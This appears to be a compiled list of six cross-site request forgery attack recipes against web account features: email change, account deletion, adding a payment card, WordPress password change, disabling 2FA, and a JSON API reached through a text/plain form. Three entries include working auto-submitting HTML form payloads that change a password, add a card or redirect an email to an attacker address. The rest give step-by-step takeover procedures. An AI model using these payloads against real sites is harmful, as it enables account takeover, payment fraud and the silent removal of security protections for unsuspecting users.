title: CSRF on email change — no token validation
desc: Email change endpoint accepted POST without CSRF token. Attacker hosts page that silently changes victim email.
steps:
1. Confirm no CSRF token on email change
2. Host auto-submitting form on attacker site
3. Victim visits — email changed → account takeover

title: CSRF on account deletion — token not validated
desc: Account deletion endpoint accepted requests without validating CSRF token. One click deletes victim account.
steps:
1. Confirm CSRF token not validated on delete endpoint
2. Host auto-submit form
3. Victim visits — account deleted

title: CSRF on payment method addition
desc: Add payment method endpoint lacked CSRF protection. Attacker could add their card to victim's account.
steps:
1. Capture add payment request — no CSRF token
2. Host auto-submit form
3. Victim visits — attacker card added to their account
payload:
<form action="https://target.com/billing/add-card" method="POST" id="f">
  <input name="card_number" value="4111111111111111">
  <input name="exp" value="12/26">
  <input name="cvv" value="123">
</form>
<script>document.getElementById('f').submit()</script>

title: CSRF on WordPress password change
desc: WordPress password change endpoint did not validate nonce for certain user roles. CSRF allowed changing password.
steps:
1. Confirm nonce not validated
2. Host CSRF form targeting /wp-admin/profile.php
3. Victim visits — password changed
payload:
<form action="https://target.com/wp-admin/profile.php" method="POST" id="f">
  <input name="pass1" value="hacked123">
  <input name="pass2" value="hacked123">
  <input name="action" value="update">
</form>
<script>document.getElementById('f').submit()</script>

title: CSRF on 2FA disable endpoint
desc: 2FA disable endpoint lacked CSRF protection. Attacker could disable victim's 2FA silently.
steps:
1. Confirm no CSRF token on 2FA disable
2. Host auto-submit form
3. Victim visits — 2FA disabled → easier account takeover

title: CSRF via JSON with text/plain Content-Type
desc: API endpoint accepted JSON with text/plain Content-Type. HTML form can send text/plain, bypassing CORS preflight.
steps:
1. Confirm endpoint accepts text/plain with JSON body
2. Host form with enctype=text/plain
3. Victim visits — JSON request sent with victim's cookies
payload:
<form action="https://api.target.com/settings" method="POST" enctype="text/plain" id="f">
  <input name='{"email":"attacker@evil.com","x":"' value='"}'>
</form>
<script>document.getElementById('f').submit()</script>
